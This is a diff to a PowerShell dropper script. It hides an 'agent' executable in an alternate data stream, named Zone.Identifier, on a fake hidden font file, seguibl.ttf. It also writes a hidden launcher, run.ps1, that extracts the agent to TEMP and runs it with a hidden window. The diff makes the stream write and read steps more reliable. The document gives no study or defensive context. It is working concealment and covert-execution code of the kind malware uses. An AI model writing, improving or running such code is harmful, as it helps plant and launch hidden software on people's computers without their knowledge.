@@ -17,26 +17,25 @@ $fontFile = "$fontDir\seguibl.ttf"
 if (-not (Test-Path $fontFile)) {
     Set-Content -Path $fontFile -Value "TTF fake font file - do not delete" -Encoding ASCII -Force
     attrib +h $fontFile
+} else {
+    # Ensure file is not read-only
+    attrib -r $fontFile 2>$null
 }
 
 $streamName = "Zone.Identifier"
-$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
+# Remove any existing stream to avoid conflicts
+Remove-Item -Path "$fontFile`:$streamName" -Force -ErrorAction SilentlyContinue
 
-# Write to ADS using FileStream (supports filename:stream syntax)
-$streamPath = "$fontFile`:$streamName"
-$fs = [System.IO.File]::Open($streamPath, 'Create', 'Write', 'None')
-try {
-    $fs.Write($agentBytes, 0, $agentBytes.Length)
-} finally {
-    $fs.Close()
-}
+# Write agent bytes to ADS using native PowerShell
+$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
+Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte -Force
 
 # Verify the write succeeded
-if (-not (Test-Path $streamPath)) {
-    throw "ADS write failed – stream not created"
+$written = Get-Content -Path $fontFile -Stream $streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
+if (-not $written -or $written.Length -eq 0) {
+    throw "ADS write failed – stream empty or missing"
 }
-$actualSize = (Get-Item $streamPath).Length
-Write-Output "Agent written to ADS ($actualSize bytes)"
+Write-Output "Agent written to ADS ($($written.Length) bytes)"
 
 # ---- 2. Launcher scripts ----
 $launcherPath = "$fontDir\run.ps1"
@@ -46,9 +45,11 @@ $launcherContent = @"
 `$streamName = '$streamName'
 `$tempAgent = "`$env:TEMP\agent.exe"
 if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
-`$bytes = [System.IO.File]::ReadAllBytes(`"`$fontFile`:`$streamName`")
-[System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
-Start-Process -WindowStyle Hidden -FilePath `$tempAgent
+`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
+if (`$bytes) {
+    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
+    Start-Process -WindowStyle Hidden -FilePath `$tempAgent
+}
 "@
 Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
 attrib +h $launcherPath
